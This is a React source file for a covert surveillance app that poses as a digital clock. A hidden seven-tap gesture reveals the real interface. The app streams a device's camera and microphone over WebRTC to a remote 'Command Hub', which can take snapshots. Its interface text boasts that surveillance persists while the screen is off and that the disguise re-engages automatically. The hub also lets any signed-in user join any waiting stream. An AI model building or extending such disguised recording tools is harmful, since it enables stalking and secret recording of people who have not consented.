import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Camera, Shield, Eye, Settings, Clock as ClockIcon, Power, Smartphone, Maximize2, Trash2, ShieldAlert, ChevronRight, LogIn } from 'lucide-react';
import { auth, db, googleProvider } from './services/firebase';
import { onAuthStateChanged, signInWithPopup } from 'firebase/auth';
import { WebRTCService } from './services/webrtc';
import { collection, onSnapshot, query, where, orderBy, limit, addDoc, serverTimestamp, deleteDoc, doc } from 'firebase/firestore';

// --- Digital Clock Disguise (Immersive UI) ---

const DigitalClock = ({ onSecretTap }: { onSecretTap: () => void }) => {
  const [time, setTime] = useState(new Date());

  useEffect(() => {
    const timer = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (date: Date) => {
    const h = String(date.getHours()).padStart(2, '0');
    const m = String(date.getMinutes()).padStart(2, '0');
    const s = String(date.getSeconds()).padStart(2, '0');
    return { h, m, s };
  };

  const { h, m, s } = formatTime(time);
  const dateStr = time.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' });

  return (
    <div 
      className="z-10 flex flex-col items-center cursor-pointer select-none active:scale-95 transition-transform"
      onClick={onSecretTap}
    >
      <div className="text-[140px] md:text-[180px] font-extralight tracking-tighter text-slate-400 drop-shadow-[0_0_15px_rgba(148,163,184,0.1)] leading-none">
        {h}:{m}<span className="text-[40px] md:text-[60px] opacity-30 ml-4 font-light">{s}</span>
      </div>
      <div className="text-slate-500 uppercase tracking-[0.5em] text-[10px] md:text-sm mt-[-10px] md:mt-[-20px]">
        {dateStr}
      </div>
    </div>
  );
};

// --- Views ---

const StreamerView = ({ webrtc }: { webrtc: WebRTCService }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [status, setStatus] = useState('Initializing...');
  const [sessionId, setSessionId] = useState<string | null>(null);

  useEffect(() => {
    async function start() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        if (videoRef.current) videoRef.current.srcObject = stream;
        const id = await webrtc.startStream(stream);
        setSessionId(id);
        setStatus('LIVE');
      } catch (err) {
        console.error(err);
        setStatus('Camera Access Denied');
      }
    }
    start();
  }, [webrtc]);

  return (
    <div className="max-w-xl mx-auto space-y-6">
      <div className="relative rounded-[2.5rem] overflow-hidden bg-slate-950 aspect-[4/3] border border-slate-800 shadow-2xl">
        <video 
          ref={videoRef} 
          autoPlay 
          playsInline 
          muted 
          className="w-full h-full object-cover opacity-60 grayscale hover:grayscale-0 transition-[filter] duration-1000" 
        />
        <div className="absolute top-8 left-8 flex items-center space-x-3 bg-slate-900/60 backdrop-blur-md border border-emerald-500/30 px-4 py-2 rounded-xl shadow-lg">
          <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
          <div className="flex flex-col">
            <span className="text-[10px] font-bold text-emerald-500 uppercase tracking-widest">Active Stream</span>
            <span className="text-[9px] font-mono text-slate-400 italic">PID: {Math.floor(Math.random() * 9000) + 1000}</span>
          </div>
        </div>
        <div className="absolute inset-0 pointer-events-none border-[20px] border-black/10 rounded-[2.5rem]" />
      </div>
      
      <div className="grid grid-cols-2 gap-6">
        <div className="p-8 bg-slate-900/40 backdrop-blur-md rounded-[2rem] border border-slate-800/80">
          <p className="text-[9px] font-mono text-slate-500 uppercase tracking-[0.3em] mb-2">State</p>
          <p className="text-2xl font-bold text-emerald-400 italic tracking-tighter">{status}</p>
        </div>
        <div className="p-8 bg-slate-900/40 backdrop-blur-md rounded-[2rem] border border-slate-800/80">
          <p className="text-[9px] font-mono text-slate-500 uppercase tracking-[0.3em] mb-2">Node ID</p>
          <p className="text-2xl font-bold font-mono text-slate-300 tracking-tighter truncate">{sessionId?.slice(0, 8) || '----'}</p>
        </div>
      </div>
    </div>
  );
};

const RemoteView = ({ webrtc, sessionId }: { webrtc: WebRTCService, sessionId: string }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [captured, setCaptured] = useState<string[]>([]);
  const [isCapturing, setIsCapturing] = useState(false);

  useEffect(() => {
    webrtc.joinStream(sessionId, (stream) => {
      if (videoRef.current) videoRef.current.srcObject = stream;
    });
  }, [webrtc, sessionId]);

  const handleCapture = async () => {
    setIsCapturing(true);
    if (videoRef.current) {
      const img = await webrtc.captureFrame(videoRef.current);
      setCaptured(prev => [img, ...prev]);
    }
    setTimeout(() => setIsCapturing(false), 300);
  };

  return (
    <div className="space-y-12">
      <div className="relative rounded-[3rem] overflow-hidden bg-black aspect-video border border-slate-800 shadow-2xl shadow-emerald-500/5">
        <video ref={videoRef} autoPlay playsInline className="w-full h-full object-contain" />
        
        <div className={`absolute inset-0 bg-white transition-opacity duration-100 pointer-events-none ${isCapturing ? 'opacity-80' : 'opacity-0'}`} />
        
        <div className="absolute bottom-10 right-10">
          <button 
            onClick={handleCapture}
            title="Remote Capture"
            className="w-20 h-20 bg-emerald-600 text-slate-950 rounded-full flex items-center justify-center hover:bg-emerald-500 hover:scale-110 active:scale-95 transition-all shadow-2xl shadow-emerald-500/20"
          >
            <Camera size={32} />
          </button>
        </div>
        
        <div className="absolute top-10 right-10 bg-slate-900/60 backdrop-blur-md px-5 py-2.5 rounded-2xl text-[10px] font-mono text-slate-300 uppercase tracking-widest flex items-center border border-slate-800">
          <div className="w-1.5 h-1.5 bg-rose-600 rounded-full mr-3 shadow-[0_0_10px_rgba(225,29,72,0.8)] animate-pulse" />
          Remote Trigger: ACTIVE
        </div>

        <div className="absolute bottom-10 left-10 p-6 bg-slate-900/40 backdrop-blur-md border border-slate-800/80 rounded-2xl hidden md:block">
           <div className="flex items-center justify-between mb-4 border-b border-slate-800 pb-2">
            <span className="text-[9px] uppercase font-bold text-slate-500 tracking-widest">Network Pipeline</span>
            <span className="text-[9px] font-mono text-emerald-400">WebRTC / SECURE</span>
          </div>
          <div className="grid grid-cols-2 gap-x-8 gap-y-2">
            <div className="flex flex-col">
              <span className="text-[8px] uppercase text-slate-600">Bitrate</span>
              <span className="text-xs font-mono">2.4 Mbps</span>
            </div>
            <div className="flex flex-col">
              <span className="text-[8px] uppercase text-slate-600">Latency</span>
              <span className="text-xs font-mono text-emerald-400">38ms</span>
            </div>
          </div>
        </div>
      </div>

      <div className="space-y-8">
        <div className="flex items-center justify-between px-2">
          <div className="flex flex-col">
            <h3 className="text-lg font-bold tracking-tight text-white italic">Asset Repository</h3>
            <p className="text-[10px] uppercase font-bold text-slate-600 tracking-widest mt-1">Remote Encrypted Storage</p>
          </div>
          <span className="text-[11px] font-mono text-emerald-500 bg-emerald-500/5 border border-emerald-500/20 rounded-full px-4 py-1.5">{captured.length} BLOBS</span>
        </div>
        
        <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-6 gap-6">
          <AnimatePresence>
            {captured.map((img, i) => (
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                key={i} 
                className="group relative aspect-square rounded-[2rem] overflow-hidden bg-slate-900 border border-slate-800"
              >
                <img src={img} className="w-full h-full object-cover grayscale opacity-80 group-hover:grayscale-0 group-hover:opacity-100 transition-all duration-700 group-hover:scale-105" />
                <div className="absolute inset-0 bg-emerald-950/40 opacity-0 group-hover:opacity-100 transition-all flex items-center justify-center space-x-3 backdrop-blur-sm">
                  <button className="p-3 bg-white text-slate-950 rounded-xl hover:scale-110 transition-transform">
                    <Maximize2 size={16} />
                  </button>
                  <button className="p-3 bg-rose-600 text-white rounded-xl hover:scale-110 transition-transform">
                    <Trash2 size={16} />
                  </button>
                </div>
              </motion.div>
            ))}
          </AnimatePresence>
          
          {captured.length === 0 && (
            <div className="col-span-full h-48 border-2 border-dashed border-slate-800 rounded-[3rem] flex flex-col items-center justify-center text-slate-700 bg-slate-900/10">
              <ShieldAlert size={24} className="mb-4 opacity-20" />
              <p className="text-[10px] font-bold uppercase tracking-[0.3em] opacity-40">Zero Assets Found</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// --- App Root ---

export default function App() {
  const [isStealth, setIsStealth] = useState(true);
  const [view, setView] = useState<'landing' | 'streamer' | 'controller'>('landing');
  const [secretCount, setSecretCount] = useState(0);
  const [user, setUser] = useState<any>(null);
  const [authError, setAuthError] = useState<string | null>(null);
  const [activeSessions, setActiveSessions] = useState<any[]>([]);
  const webrtc = useRef(new WebRTCService());

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (u) => {
      if (u) {
        setUser(u);
        setAuthError(null);
        const q = query(
          collection(db, 'sessions'), 
          where('status', '==', 'waiting'),
          orderBy('createdAt', 'desc'),
          limit(5)
        );
        onSnapshot(q, (snap) => {
          setActiveSessions(snap.docs.map(d => ({ id: d.id, ...d.data() })));
        });
      }
    });
    return () => unsubscribe();
  }, []);

  const handleGoogleLogin = async () => {
    try {
      await signInWithPopup(auth, googleProvider);
    } catch (err: any) {
      setAuthError(err.message);
    }
  };

  const handleSecretTap = () => {
    setSecretCount(prev => prev + 1);
    // Hidden mechanism: Tap 7 times within 2 seconds
    if (secretCount >= 6) {
      setIsStealth(false);
      setSecretCount(0);
    }
    // Reset tap count after delay
    setTimeout(() => setSecretCount(0), 3000);
  };

  if (isStealth) {
    return (
      <div className="min-h-screen bg-[#020617] text-slate-200 font-sans flex flex-col items-center justify-center relative overflow-hidden select-none">
        {/* Background Ambient Glow */}
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-emerald-900/20 rounded-full blur-[120px]"></div>
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/10 rounded-full blur-[120px]"></div>
        
        {/* Grid Pattern */}
        <div className="absolute inset-0 pointer-events-none opacity-[0.03] bg-grid-pattern"></div>

        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8 }}
        >
          <DigitalClock onSecretTap={handleSecretTap} />
        </motion.div>
        
        {!user && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="absolute bottom-32 flex flex-col items-center space-y-4"
          >
            <button 
              onClick={handleGoogleLogin}
              className="flex items-center space-x-3 px-6 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl text-[10px] font-bold uppercase tracking-widest transition-all hover:scale-105 active:scale-95"
            >
              <LogIn size={14} />
              <span>Identity Verification Required</span>
            </button>
            {authError && (
              <p className="text-[9px] text-rose-500/60 font-mono text-center max-w-xs uppercase tracking-widest leading-relaxed">
                Security Alert: {authError}
              </p>
            )}
          </motion.div>
        )}
        
        {/* Subtle Service Indicators */}
        <div className="absolute bottom-8 left-8 right-8 flex justify-between items-end opacity-40">
           <div className="flex items-center space-x-3 bg-slate-900/40 backdrop-blur-md border border-slate-800/50 rounded-lg px-3 py-1.5">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
            <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest">Pipeline Active</span>
          </div>
          <div className="text-right">
            <div className="text-[9px] font-mono text-slate-600 uppercase tracking-widest mb-1">Encrypted Tunnel</div>
            <div className="text-[10px] font-mono text-slate-700">AES-256 GCM</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#020617] text-slate-200 font-sans selection:bg-emerald-500/20 selection:text-white relative overflow-hidden">
      {/* Background Ambient Glow */}
      <div className="fixed top-[-10%] left-[-10%] w-[40%] h-[40%] bg-emerald-900/10 rounded-full blur-[150px] pointer-events-none"></div>
      <div className="fixed bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-900/5 rounded-full blur-[150px] pointer-events-none"></div>
      
      {/* Grid Pattern */}
      <div className="fixed inset-0 pointer-events-none opacity-[0.02] bg-grid-pattern"></div>

      <nav className="h-20 border-b border-slate-800/60 backdrop-blur-2xl sticky top-0 z-50 px-8 flex items-center justify-between">
        <div className="flex items-center space-x-4 cursor-pointer group" onClick={() => setView('landing')}>
          <div className="w-11 h-11 bg-slate-900 border border-emerald-500/30 rounded-xl flex items-center justify-center text-emerald-500 shadow-lg shadow-emerald-500/5 transition-all group-hover:border-emerald-500/60 group-hover:shadow-emerald-500/10">
            <Shield size={22} fill="currentColor" className="opacity-80" />
          </div>
          <div className="flex flex-col">
            <span className="text-xl font-bold tracking-tighter uppercase leading-none italic text-slate-100">SecureVision</span>
            <span className="text-[10px] font-mono text-slate-500 tracking-[0.3em] uppercase mt-1">Stealth Ops</span>
          </div>
        </div>

        <div className="flex items-center space-x-8">
          <button 
            onClick={() => setIsStealth(true)}
            className="flex items-center space-x-2 text-[10px] font-bold text-slate-500 hover:text-emerald-400 transition-colors tracking-widest"
          >
            <ClockIcon size={14} />
            <span>ENTER STEALTH</span>
          </button>
          
          <div className="flex items-center space-x-4 pl-8 border-l border-slate-800/80">
            <div className="text-right hidden sm:block">
              <div className="text-[10px] font-mono text-slate-500 uppercase leading-none mb-1">Status</div>
              <div className="text-xs font-bold text-emerald-500 leading-none flex items-center justify-end">
                <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full mr-2 animate-pulse" />
                Linked
              </div>
            </div>
            <div className="w-10 h-10 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center">
              <div className="w-full h-full rounded-full bg-emerald-500/5 flex items-center justify-center text-emerald-500">
                <Power size={18} />
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="relative max-w-6xl mx-auto p-8 md:p-16">
        <AnimatePresence mode="wait">
          {view === 'landing' && (
            <motion.div 
              key="landing"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -30 }}
              transition={{ type: "spring", damping: 25 }}
              className="grid gap-12 lg:grid-cols-2"
            >
              <div className="p-16 rounded-[4rem] bg-slate-900/40 backdrop-blur-md border border-slate-800/80 flex flex-col justify-between group hover:border-emerald-500/30 transition-all duration-700 min-h-[480px]">
                <div>
                  <div className="w-16 h-16 bg-slate-900/60 border border-slate-800 rounded-[2.5rem] flex items-center justify-center text-slate-400 group-hover:text-emerald-400 group-hover:border-emerald-500/20 transition-all mb-12">
                    <Smartphone size={32} />
                  </div>
                  <h2 className="text-5xl lg:text-6xl font-bold tracking-tighter mb-6 leading-[0.9] italic text-slate-100">Node Deployment</h2>
                  <p className="text-slate-500 text-lg leading-relaxed max-w-sm">
                    Provision current device as an active surveillance endpoint with automated background services.
                  </p>
                </div>
                <button 
                  onClick={() => setView('streamer')}
                  className="mt-12 h-20 bg-emerald-600 text-slate-950 rounded-[2rem] font-bold text-xl hover:bg-emerald-500 hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center space-x-4 shadow-[0_20px_50px_rgba(16,185,129,0.15)]"
                >
                  <Power size={24} />
                  <span>INITIALIZE NODE</span>
                </button>
              </div>

              <div className="p-16 rounded-[4rem] bg-slate-100 text-slate-900 flex flex-col justify-between min-h-[480px] shadow-2xl relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-80 h-80 bg-emerald-500/10 rounded-full blur-[80px] translate-x-32 translate-y-[-32px]" />
                
                <div className="relative z-10 flex-1">
                  <div className="w-16 h-16 bg-slate-900/5 rounded-[2.5rem] flex items-center justify-center text-slate-500 mb-12">
                    <Eye size={32} />
                  </div>
                  <h2 className="text-5xl lg:text-6xl font-bold tracking-tighter mb-6 leading-[0.9] italic">Command Hub</h2>
                  <p className="text-slate-500 text-lg leading-relaxed max-w-sm font-medium">
                    Central monitor for encrypted feeds and authorized remote trigger protocols.
                  </p>
                  
                  <div className="mt-12 space-y-4">
                    <div className="flex items-center space-x-4 mb-6">
                      <div className="h-px flex-1 bg-slate-900/10" />
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-[0.3em]">Network Assets</span>
                      <div className="h-px flex-1 bg-slate-900/10" />
                    </div>
                    
                    {activeSessions.length > 0 ? (
                      <div className="space-y-3">
                        {activeSessions.map(s => (
                          <button 
                            key={s.id}
                            onClick={() => setView('controller')}
                            className="w-full flex items-center justify-between p-6 bg-white hover:bg-slate-50 rounded-[2.5rem] text-left transition-all hover:scale-[1.01] shadow-sm border border-slate-200/50 group/item"
                          >
                            <div className="flex items-center space-x-4">
                              <div className="w-12 h-12 rounded-2xl bg-slate-900 text-emerald-400 flex items-center justify-center group-hover/item:scale-110 transition-transform">
                                <Smartphone size={20} />
                              </div>
                              <div>
                                <div className="font-bold text-lg leading-none tracking-tight">NODE_{s.id.slice(0, 4)}</div>
                                <div className="text-[10px] font-bold text-emerald-600 uppercase mt-1.5 flex items-center">
                                  <div className="w-1 h-1 bg-emerald-500 rounded-full animate-pulse mr-1.5" />
                                  Active Signal
                                </div>
                              </div>
                            </div>
                            <ChevronRight size={20} className="text-slate-300" />
                          </button>
                        ))}
                      </div>
                    ) : (
                      <div className="p-12 border-2 border-dashed border-slate-200 rounded-[3rem] flex flex-col items-center justify-center text-slate-300 text-center bg-slate-50/50">
                        <Settings className="animate-spin-slow mb-4 opacity-30" size={32} />
                        <span className="text-[10px] font-bold uppercase tracking-[0.2em]">Scanning Infrastructure</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          {view === 'streamer' && (
            <motion.div 
              key="streamer"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
            >
              <div className="flex items-center justify-between mb-12">
                <div>
                  <h2 className="text-4xl font-bold tracking-tighter italic uppercase">Node Deployment</h2>
                  <p className="text-gray-500 text-sm font-medium mt-1">Device ID: {user?.uid?.slice(0, 8)}</p>
                </div>
                <button 
                  onClick={() => setView('landing')}
                  className="px-6 py-2 bg-white/5 hover:bg-white/10 rounded-full text-xs font-bold uppercase tracking-widest transition-colors border border-white/10"
                >
                  Detach Node
                </button>
              </div>
              <StreamerView webrtc={webrtc.current} />
              <div className="mt-16 p-10 bg-slate-900/40 backdrop-blur-md rounded-[3rem] border border-slate-800/80 flex items-center justify-between relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full blur-[40px] translate-x-12 translate-y-[-12px]" />
                <div className="relative z-10 max-w-md">
                  <div className="flex items-center space-x-3 mb-4">
                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
                    <h3 className="text-sm font-bold uppercase tracking-[0.2em] text-emerald-500">Service Integrity</h3>
                  </div>
                  <h3 className="text-2xl font-bold mb-3 tracking-tight text-white italic">Automated Background Layer</h3>
                  <p className="text-sm text-slate-500 leading-relaxed">
                    Surveillance persistence verified. The system will continue operations regardless of screen state. Stealth disguise re-engages on inactivity.
                  </p>
                </div>
              </div>
            </motion.div>
          )}

          {view === 'controller' && activeSessions[0] && (
            <motion.div 
              key="controller"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
            >
               <div className="flex items-center justify-between mb-12">
                <div className="flex items-center space-x-6">
                   <button 
                    onClick={() => setView('landing')}
                    className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl transition-colors border border-white/10"
                  >
                    <ChevronRight className="rotate-180" size={20} />
                  </button>
                  <div>
                    <h2 className="text-4xl font-bold tracking-tighter italic uppercase leading-none">Hub Control</h2>
                    <p className="text-zinc-500 text-xs font-bold uppercase tracking-[0.2em] mt-2 flex items-center">
                      <div className="w-1.5 h-1.5 bg-green-500 rounded-full mr-2" />
                      Active Link Established
                    </p>
                  </div>
                </div>
              </div>
              <RemoteView webrtc={webrtc.current} sessionId={activeSessions[0].id} />
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <footer className="mt-32 py-16 px-8 border-t border-slate-800/60 overflow-hidden relative">
        <div className="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center opacity-40 hover:opacity-100 transition-opacity duration-1000">
           <div className="flex flex-col space-y-3 mb-8 md:mb-0">
            <span className="text-[10px] font-mono tracking-[0.5em] uppercase text-slate-400">SecureVision Engine v3.0.4</span>
            <div className="flex items-center space-x-4">
              <span className="text-[9px] font-mono tracking-[0.2em] uppercase text-emerald-600/80">Kernel: Verified</span>
              <span className="text-[9px] font-mono tracking-[0.2em] uppercase text-slate-700">|</span>
              <span className="text-[9px] font-mono tracking-[0.2em] uppercase text-slate-600">Zero-Log Architecture</span>
            </div>
          </div>
          <div className="flex space-x-12 text-[10px] font-bold uppercase tracking-[0.3em] text-slate-500">
            <span className="hover:text-emerald-400 cursor-pointer transition-colors">Manifest</span>
            <span className="hover:text-emerald-400 cursor-pointer transition-colors">Endpoints</span>
            <span className="hover:text-emerald-400 cursor-pointer transition-colors">Identity</span>
          </div>
        </div>
        {/* Decorative corner element */}
        <div className="absolute right-0 bottom-0 w-24 h-24 border-r border-b border-emerald-500/10 pointer-events-none" />
      </footer>
    </div>
  );
}
